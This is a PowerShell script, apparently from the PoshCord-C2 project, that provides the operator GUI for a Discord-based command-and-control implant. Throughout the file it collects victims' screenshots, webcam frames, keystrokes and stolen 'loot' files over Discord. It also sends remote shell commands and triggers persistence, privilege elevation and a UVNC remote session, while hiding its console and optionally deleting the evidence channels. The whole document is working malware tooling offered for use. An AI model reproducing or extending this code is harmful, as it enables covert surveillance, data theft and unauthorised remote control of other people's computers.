
<# ============================== PoshCord-C2 Control ===================================
**SYNOPSIS**
This script creates a GUI for receiving the info stream from one Poshcord-C2 client.

**USAGE**
1. Replace TOKEN_1_HERE with the main token. (the token used for the client)
2. Create a SECOND bot with the same permissions as the client bot and add it to the same server.
3. Replace TOKEN_2_HERE with the token you just created (used for sending messages like a user)
4. Run the script to create the Control GUI

**IMPORTANT**
- Both bots must only be in ONE Server ONLY.
- Run This Script AFTER starting the client session
- Only one set of client channels can be in the server (delete closed sessions in discord after use).
- Add ->   -ip your.ip.address.or.domain -port 8080 to the 'session command input' box before running StartUVNC
- get UVNC listener here - https://github.com/beigeworm/assets/raw/main/uvnc-server.zip
============================================================================================
#>

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

# Variables for token and channel IDs
$token = "$tk1" # YOUR MAIN BOT TOKEN (USED FOR CLIENT)
$token2 = "$tk2" # BOT TO SEND MESSAGES AS USER

# ============================ SCRIPT SETUP =============================
$hidewindow = 1 #Hide the console window

If ($HideWindow -gt 0){
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

function Get-DiscordChannelIDs {
    param([string]$Token)
    $channelNames = @("powershell", "screenshots", "webcam", "session-control", "loot-files", "keycapture")
    $headers = @{
        Authorization = "Bot $Token"
    }
    $guildID = $null
    while (!($guildID)){    
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)    
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        foreach ($guild in $guilds) {
            $guildID = $guild.id
        }
        sleep 3
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    while (!($channelsResponse)){    
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)    
        $response = $wc.DownloadString("https://discord.com/api/guilds/$guildID/channels")
        $channelsResponse = $response | ConvertFrom-Json
        sleep 3
    }
    foreach ($channel in $channelsResponse) {
        if ($channel.name -eq "powershell") {
            $global:PSID = $channel.id
        } elseif ($channel.name -eq "screenshots") {
            $global:ID1 = $channel.id
        } elseif ($channel.name -eq "webcam") {
            $global:ID2 = $channel.id
        } elseif ($channel.name -eq "session-control") {
            $global:ID3 = $channel.id
        } elseif ($channel.name -eq "keycapture") {
            $global:ID4 = $channel.id
        } elseif ($channel.name -eq "loot-files") {
            $global:ID5 = $channel.id
        }
    }
}

Get-DiscordChannelIDs -Token $token 

# ============================ GUI SETUP =============================

$imageUrl = "https://i.imgur.com/RJSsYC7.png"
$client = New-Object System.Net.WebClient
$imageBytes = $client.DownloadData($imageUrl)
$ms = New-Object IO.MemoryStream($imageBytes, 0, $imageBytes.Length)

$form = New-Object System.Windows.Forms.Form
$form.Text = "C2 Control"
$form.Width = 1255
$form.Height = 950
$form.BackColor = "#242424"
$form.BackgroundImage = [System.Drawing.Image]::FromStream($ms, $true)
$form.BackgroundImageLayout = 'Stretch'
$iconMs = New-Object IO.MemoryStream
$iconMs.Write($imageBytes, 0, $imageBytes.Length)
$iconMs.Seek(0, 'Begin')
$form.Icon = [System.Drawing.Icon]::FromHandle(( [System.Drawing.Bitmap]::FromStream($iconMs) ).GetHicon())
$form.Font = 'Microsoft Sans Serif,10,style=Bold'

$TextBoxHeader = New-Object System.Windows.Forms.Label
$TextBoxHeader.Text = "Powershell Input"
$TextBoxHeader.AutoSize = $true
$TextBoxHeader.ForeColor = "#eeeeee"
$TextBoxHeader.Width = 25
$TextBoxHeader.Height = 10
$TextBoxHeader.Location = New-Object System.Drawing.Point(10, 840)
$form.Controls.Add($TextBoxHeader)

$TextBoxInput = New-Object System.Windows.Forms.TextBox
$TextBoxInput.Location = New-Object System.Drawing.Point(10, 860)
$TextBoxInput.BackColor = "#eeeeee"
$TextBoxInput.Width = 470
$TextBoxInput.Height = 40
$TextBoxInput.Text = ""
$TextBoxInput.Multiline = $false
$TextBoxInput.Font = 'Microsoft Sans Serif,10'
$form.Controls.Add($TextBoxInput)

$TextBox2Header = New-Object System.Windows.Forms.Label
$TextBox2Header.Text = "Session Command Input"
$TextBox2Header.AutoSize = $true
$TextBox2Header.ForeColor = "#eeeeee"
$TextBox2Header.Width = 25
$TextBox2Header.Height = 10
$TextBox2Header.Location = New-Object System.Drawing.Point(620, 840)
$form.Controls.Add($TextBox2Header)

$TextBox2Input = New-Object System.Windows.Forms.TextBox
$TextBox2Input.Location = New-Object System.Drawing.Point(620, 860)
$TextBox2Input.BackColor = "#eeeeee"
$TextBox2Input.Width = 470
$TextBox2Input.Height = 40
$TextBox2Input.Text = ""
$TextBox2Input.Multiline = $false
$TextBox2Input.Font = 'Microsoft Sans Serif,10'
$form.Controls.Add($TextBox2Input)

$Button = New-Object System.Windows.Forms.Button
$Button.Text = "Send"
$Button.Width = 100
$Button.Height = 30
$Button.Location = New-Object System.Drawing.Point(495, 855)
$Button.BackColor = "#eeeeee"
$form.Controls.Add($Button)

$Button2 = New-Object System.Windows.Forms.Button
$Button2.Text = "CLOSE SESSION"
$Button2.Width = 180
$Button2.Height = 35
$Button2.Location = New-Object System.Drawing.Point(1035, 790)
$Button2.BackColor = "Red"
$form.Controls.Add($Button2)

$Button3 = New-Object System.Windows.Forms.Button
$Button3.Text = "Send"
$Button3.Width = 100
$Button3.Height = 30
$Button3.Location = New-Object System.Drawing.Point(1110, 855)
$Button3.BackColor = "#eeeeee"
$form.Controls.Add($Button3)

$Button4 = New-Object System.Windows.Forms.Button
$Button4.Text = "Persistance: OFF"
$Button4.Width = 180
$Button4.Height = 30
$Button4.Location = New-Object System.Drawing.Point(1035, 710)
$Button4.BackColor = "Red"
$form.Controls.Add($Button4)

$Button5 = New-Object System.Windows.Forms.Button
$Button5.Text = "Try Get Admin"
$Button5.Width = 180
$Button5.Height = 30
$Button5.Location = New-Object System.Drawing.Point(1035, 480)
$Button5.BackColor = "#eeeeee"
$form.Controls.Add($Button5)

$Button6 = New-Object System.Windows.Forms.Button
$Button6.Text = "Session: Running"
$Button6.Width = 180
$Button6.Height = 30
$Button6.Location = New-Object System.Drawing.Point(1035, 750)
$Button6.BackColor = "Green"
$form.Controls.Add($Button6)

$Button7 = New-Object System.Windows.Forms.Button
$Button7.Text = "Dark Mode: OFF"
$Button7.Width = 180
$Button7.Height = 30
$Button7.BackColor = "#eeeeee"
$Button7.Location = New-Object System.Drawing.Point(1035, 520)
$form.Controls.Add($Button7)

$Button8 = New-Object System.Windows.Forms.Button
$Button8.Text = "Start UVNC"
$Button8.Width = 180
$Button8.Height = 30
$Button8.Location = New-Object System.Drawing.Point(1035, 560)
$Button8.BackColor = "#eeeeee"
$form.Controls.Add($Button8)

$Button9 = New-Object System.Windows.Forms.Button
$Button9.Text = "Spawn Goose"
$Button9.Width = 180
$Button9.Height = 30
$Button9.Location = New-Object System.Drawing.Point(1035, 600)
$Button9.BackColor = "#eeeeee"
$form.Controls.Add($Button9)

$folderButton = New-Object Windows.Forms.Button
$folderButton.Text = "Browse Loot"
$folderButton.Location = New-Object Drawing.Point (1035, 670)
$folderButton.Width = 180
$folderButton.Height = 30
$folderButton.BackColor = "#eeeeee"
$form.Controls.Add($folderButton)

$boxtext = New-Object System.Windows.Forms.Label
$boxtext.Text = "Delete Channels On Close"
$boxtext.ForeColor = "#bcbcbc"
$boxtext.AutoSize = $true
$boxtext.Width = 25
$boxtext.Height = 10
$boxtext.Location = New-Object System.Drawing.Point(1060, 833)
$boxtext.Font = 'Microsoft Sans Serif,8,style=Bold'
$form.Controls.Add($boxtext)

$delbox = New-Object System.Windows.Forms.CheckBox
$delbox.Width = 20
$delbox.Height = 20
$delbox.Location = New-Object System.Drawing.Point(1040, 830)
$form.Controls.Add($delbox)

$OutputBoxHeader = New-Object System.Windows.Forms.Label
$OutputBoxHeader.Text = "Powershell Output"
$OutputBoxHeader.AutoSize = $true
$OutputBoxHeader.ForeColor = "#eeeeee"
$OutputBoxHeader.Width = 25
$OutputBoxHeader.Height = 10
$OutputBoxHeader.Location = New-Object System.Drawing.Point(10, 460)
$form.Controls.Add($OutputBoxHeader)

$OutputBox = New-Object System.Windows.Forms.RichTextBox 
$OutputBox.Multiline = $True
$OutputBox.Location = New-Object System.Drawing.Size(10,480) 
$OutputBox.Width = 600
$OutputBox.Height = 340
$OutputBox.Scrollbars = "Vertical" 
$OutputBox.Text = ""
$OutputBox.Font = 'Microsoft Sans Serif,10'
$OutputBox.BackColor = "#d3d3d3"
$form.Controls.Add($OutputBox)

$OutputBoxHeader2 = New-Object System.Windows.Forms.Label
$OutputBoxHeader2.Text = "Keylogger Output"
$OutputBoxHeader2.AutoSize = $true
$OutputBoxHeader2.ForeColor = "#eeeeee"
$OutputBoxHeader2.Width = 25
$OutputBoxHeader2.Height = 10
$OutputBoxHeader2.Location = New-Object System.Drawing.Point(620, 460)
$form.Controls.Add($OutputBoxHeader2)

$OutputBox2 = New-Object System.Windows.Forms.RichTextBox
$OutputBox2.Multiline = $True
$OutputBox2.Location = New-Object System.Drawing.Size(620,480) 
$OutputBox2.Width = 400
$OutputBox2.Height = 150
$OutputBox2.Scrollbars = "Vertical" 
$OutputBox2.Text = ""
$OutputBox2.Font = 'Microsoft Sans Serif,10'
$OutputBox2.BackColor = "#d3d3d3"
$form.Controls.Add($OutputBox2)

$OutputBoxHeader3 = New-Object System.Windows.Forms.Label
$OutputBoxHeader3.Text = "Session Control Output"
$OutputBoxHeader3.AutoSize = $true
$OutputBoxHeader3.ForeColor = "#eeeeee"
$OutputBoxHeader3.Width = 25
$OutputBoxHeader3.Height = 10
$OutputBoxHeader3.Location = New-Object System.Drawing.Point(620, 650)
$form.Controls.Add($OutputBoxHeader3)

$OutputBox3 = New-Object System.Windows.Forms.RichTextBox
$OutputBox3.Multiline = $True
$OutputBox3.Location = New-Object System.Drawing.Size(620,670) 
$OutputBox3.Width = 400
$OutputBox3.Height = 150
$OutputBox3.Scrollbars = "Vertical" 
$OutputBox3.Text = ""
$OutputBox3.Font = 'Microsoft Sans Serif,10'
$OutputBox3.BackColor = "#d3d3d3"
$form.Controls.Add($OutputBox3)

$pictureBox1Header = New-Object System.Windows.Forms.Label
$pictureBox1Header.Text = "Screenshots"
$pictureBox1Header.AutoSize = $true
$pictureBox1Header.ForeColor = "#eeeeee"
$pictureBox1Header.Width = 25
$pictureBox1Header.Height = 10
$pictureBox1Header.Location = New-Object System.Drawing.Point(10, 30)
$form.Controls.Add($pictureBox1Header)

$pictureBox2Header = New-Object System.Windows.Forms.Label
$pictureBox2Header.Text = "Webcam Stream"
$pictureBox2Header.AutoSize = $true
$pictureBox2Header.ForeColor = "#eeeeee"
$pictureBox2Header.Width = 25
$pictureBox2Header.Height = 10
$pictureBox2Header.Location = New-Object System.Drawing.Point(620, 30)
$form.Controls.Add($pictureBox2Header)

# ============================ FUNCTION SETUP =============================

function Create-ImageForm {
    param ([string]$imagePath1,[string]$imagePath2)

    $pictureBox1 = New-Object System.Windows.Forms.PictureBox
    $pictureBox1.Width = 600
    $pictureBox1.Height = 400
    $pictureBox1.Top = 50
    $pictureBox1.Left = 10
    $pictureBox1.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
    $pictureBox1.ImageLocation = $imagePath1

    $pictureBox2 = New-Object System.Windows.Forms.PictureBox
    $pictureBox2.Width = 600
    $pictureBox2.Height = 400
    $pictureBox2.Top = 50
    $pictureBox2.Left = 620
    $pictureBox2.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
    $pictureBox2.ImageLocation = $imagePath2

    $form.Controls.Add($pictureBox1)
    $form.Controls.Add($pictureBox2)
    return $form, $pictureBox1, $pictureBox2
}

function Update-ImageForm {
    param (
        [string]$imagePath,
        [System.Windows.Forms.PictureBox]$pictureBox
    )

    $pictureBox.ImageLocation = $imagePath
    $pictureBox.Refresh()
}

Function Add-OutputBoxLine {
    Param (
        [string]$outfeed,
        [ValidateSet("OutputBox", "OutputBox2", "OutputBox3")]
        [string]$OutputBoxName,
        [string]$ForeColor,
        [string]$BackColor
    )

    $formattedOutfeed = $outfeed -replace "`n", "`r`n"
    switch ($OutputBoxName) {
        "OutputBox" { $OutputBoxRef = $OutputBox }
        "OutputBox2" { $OutputBoxRef = $OutputBox2 }
        "OutputBox3" { $OutputBoxRef = $OutputBox3 }
    }

    $OutputBoxRef.SelectionStart = $OutputBoxRef.TextLength
    $OutputBoxRef.SelectionLength = 0
    $OutputBoxRef.SelectionColor = $ForeColor
    $OutputBoxRef.SelectionBackColor = $BackColor
    $OutputBoxRef.AppendText("`r`n$formattedOutfeed")
    $OutputBoxRef.SelectionColor = $OutputBoxRef.ForeColor
    $OutputBoxRef.SelectionBackColor = $OutputBoxRef.BackColor
    $OutputBoxRef.Refresh()
    $OutputBoxRef.ScrollToCaret()
}

function sendMsg {
    param([string]$Message,[string]$id)

    $url = "https://discord.com/api/v10/channels/$id/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token2")
    if ($Message) {
            $jsonBody = @{
                "content" = "$Message"
                "username" = "$env:computername"
            } | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $response = $wc.UploadString($url, "POST", $jsonBody)
	        $message = $null
    }
}

Function Get-BotUserId {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
    $botInfo = $botInfo | ConvertFrom-Json
    return $botInfo.id
}
$botId = Get-BotUserId

function DisplayNewMSG{
    param([string]$box,[string]$id)

    $latestMessageId = $null
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$ID/messages")
    $messages = $messages | ConvertFrom-Json
    $newMessages = @()
    foreach ($message in $messages) {
        if ($message.timestamp -gt $lastMessageId) {
            if ($message.author.bot -and $message.author.id -eq $botId) {
                $newMessages += $message
            }
        }
    }
    if ($newMessages.Count -gt 0) {
        $latestMessageId = ($newMessages | Sort-Object -Property timestamp -Descending)[0].timestamp
        $script:lastMessageId = $latestMessageId
        $sortedNewMessages = $newMessages | Sort-Object -Property timestamp
        foreach ($message in $sortedNewMessages) {
            $messageContent = $message.content -replace "``" ,""
            $messageContent = $messageContent -replace ":[a-zA-Z_]+:", ""
            if ($messageContent -like ":mag_right: `Keys Captured :*") {
                $messageContent = $messageContent -replace "^:mag_right: `Keys Captured :", ""
                Add-OutputBoxLine -Outfeed $messageContent -OutputBoxName $box
            }
            elseif ($messageContent -like "PS |*"){
                Add-OutputBoxLine -Outfeed $messageContent -OutputBoxName $box -ForeColor "Gray"
            }
            else{
                Add-OutputBoxLine -Outfeed $messageContent -OutputBoxName $box 
            }
        }
    }

}

Function DeleteChannels {
    param([string[]]$channelNames)
    
    $headers = @{
        'Authorization' = "Bot $token"
    }    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)    
    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
    $guilds = $response | ConvertFrom-Json

    foreach ($guild in $guilds) {
        $guildID = $guild.id
        $uri = "https://discord.com/api/guilds/$guildID/channels"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)        
        $response = $wc.DownloadString($uri)
        $channels = $response | ConvertFrom-Json

        foreach ($channel in $channels) {
            if ($channel.name -in $channelNames) {
                $channelID = $channel.id
                $deleteUri = "https://discord.com/api/v10/channels/$channelID"
                try {
                    $wc.Headers.Add("Content-Type", "application/json")
                    $response = $wc.UploadString($deleteUri, "DELETE", "")
                    Write-Host "Deleted channel: $($channel.name) with ID: $($channelID)"
                } catch {
                    Write-Host "Failed to delete channel: $($channel.name) with ID: $($channelID). Error: $_"
                }
            }
        }
    }
}

function get-lootfiles {
    param ([string]$ID,[string]$lootPath)
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $messages1 = $wc.DownloadString("https://discord.com/api/v10/channels/$ID/messages")
    $messages1 = $messages1 | ConvertFrom-Json
    
    foreach ($message in $messages1) {

        foreach ($attachment in $message.attachments) {
            $imageUrl = $attachment.url
            $filename = $attachment.filename

            $filePath = Join-Path -Path $lootPath -ChildPath $filename

            if (!(Test-Path $filePath)) {
                $wc.DownloadFile($imageUrl, $filePath)
            }
            
        }
    }
}

$lootfolder = "$env:temp\loot"
New-Item -Path $lootfolder -ItemType Directory -Force
get-lootfiles -ID $ID5 -lootPath $lootfolder

# ============================ LOOP SETUP =============================

$headers = @{
    'Authorization' = "Bot $token"
}
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("Authorization", $headers.Authorization)

$latestImageUrl1 = ""
$latestImageUrl2 = ""
$imageForm = $null
$pictureBox1 = $null
$pictureBox2 = $null

$imagePath1 = "$env:TEMP\loot\Screen.jpg"
$imagePath2 = "$env:TEMP\loot\Webcam.jpg"
$form, $pictureBox1, $pictureBox2 = Create-ImageForm -imagePath1 $imagePath1 -imagePath2 $imagePath2

$form.Add_Shown({ $form.Activate() })
$form.Show()

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 10000

$timer.Add_Tick({
    try {
        $messages1 = $wc.DownloadString("https://discord.com/api/v10/channels/$ID1/messages")
        $messages1 = $messages1 | ConvertFrom-Json
        foreach ($message in $messages1) {
            foreach ($attachment in $message.attachments) {
                if ($attachment.filename -match "\.jpg$") {
                    $imageUrl = $attachment.url
                    if ($imageUrl -ne $latestImageUrl1) {
                        $latestImageUrl1 = $imageUrl
                        $wc.DownloadFile($imageUrl, $imagePath1)
                        Update-ImageForm -imagePath $imagePath1 -pictureBox $pictureBox1
                    }
                    break
                }
            }
            if ($latestImageUrl1 -ne $null) {
                break
            }
        }

        $messages2 = $wc.DownloadString("https://discord.com/api/v10/channels/$ID2/messages")
        $messages2 = $messages2 | ConvertFrom-Json
        foreach ($message in $messages2) {
            foreach ($attachment in $message.attachments) {
                if ($attachment.filename -match "\.jpg$") {
                    $imageUrl = $attachment.url
                    if ($imageUrl -ne $latestImageUrl2) {
                        $latestImageUrl2 = $imageUrl
                        $wc.DownloadFile($imageUrl, $imagePath2)
                        Update-ImageForm -imagePath $imagePath2 -pictureBox $pictureBox2
                    }
                    break
                }
            }
            if ($latestImageUrl2 -ne $null) {
                break
            }
        }
    } catch {
        Write-Error "An error occurred: $_"
    }



    DisplayNewMSG -id $PSID -box "OutputBox"
    sleep -m 200
    DisplayNewMSG -id $ID4 -box "OutputBox2"
    sleep -m 200
    DisplayNewMSG -id $ID3 -box "OutputBox3"

})

# ============================ ACTION SETUP =============================

$button.Add_Click({
$msgtosend = $TextBoxInput.Text
sendMsg -Message $msgtosend -id $PSID
Add-OutputBoxLine -Outfeed "PS Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
})

$button2.Add_Click({
    $sure = (New-Object -ComObject Wscript.Shell).Popup("Are you Sure you want to quit?",0,"Close Session",0x1)
    if ($sure -eq 1){
        Add-OutputBoxLine -Outfeed "CLOSING SESSION" -OutputBoxName "OutputBox3" -ForeColor "Red"
        sendMsg -Message 'close' -id $ID3
        sleep 5
        if($delbox.Checked){
            $channelNamesToDelete = @("powershell", "screenshots", "webcam", "session-control", "loot-files", "keycapture", "microphone")
            DeleteChannels -channelNames $channelNamesToDelete
        }
        $form.Close()
        sleep 2
        exit
    }
})

$button3.Add_Click({
$msgtosend = $TextBox2Input.Text
sendMsg -Message $msgtosend -id $ID3
Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
})

$4on = $false
$button4.Add_Click({
if ($4on -eq $false){
    $Button4.Text = "Persistance: ON"
    $msgtosend = 'addpersistance'
    $Button4.BackColor = "Green"
    $script:4on = $true
    sleep 1
}
else{
    $Button4.Text = "Persistance: OFF"
    $msgtosend = 'removepersistance'
    $Button4.BackColor = "Red"
    $script:4on = $false
    sleep 1
}
sendMsg -Message $msgtosend -id $ID3
Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
})

$button5.Add_Click({
$msgtosend = 'elevate'
sendMsg -Message $msgtosend -id $ID3
Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
})

$6on = $false
$button6.Add_Click({
if ($6on -eq $false){
    $button6.Text = "Session: Paused"
    $msgtosend = 'pausejobs'
    $Button6.BackColor = "Red"
    $script:6on = $true
    sleep 1
}
else{
    $button6.Text = "Session: Running"
    $msgtosend = 'startall'
    $Button6.BackColor = "Green"
    $script:6on = $false
    sleep 1
}
sendMsg -Message $msgtosend -id $ID3
Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
})

$7on = $false
$button7.Add_Click({
if ($7on -eq $false){
    $button7.Text = "Dark Mode: ON"
    $msgtosend = 'enabledarkmode'
    $script:7on = $true
    sleep 1
}
else{
    $button7.Text = "Dark Mode: OFF"
    $msgtosend = 'disabledarkmode'
    $script:7on = $false
    sleep 1
}
sendMsg -Message $msgtosend -id $ID3
Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
})

$button8.Add_Click({
$args = $TextBox2Input.Text
$msgtosend = "startuvnc $args"
sendMsg -Message $msgtosend -id $ID3
Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
})

$button9.Add_Click({
$msgtosend = "goose"
sendMsg -Message $msgtosend -id $ID3
Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
})


$folderButton.Add_Click({
$lootfolder = "$env:temp\loot"
explorer.exe $lootfolder
Add-OutputBoxLine -Outfeed "Opening Loot Folder" -OutputBoxName "OutputBox3" -ForeColor "Green"
get-lootfiles -ID $ID5 -lootPath $lootfolder
})

# ============================ START GUI =============================

Add-OutputBoxLine -Outfeed "Setup Complete" -OutputBoxName "OutputBox3" -ForeColor "Green"

$timer.Start()
[System.Windows.Forms.Application]::Run($form)
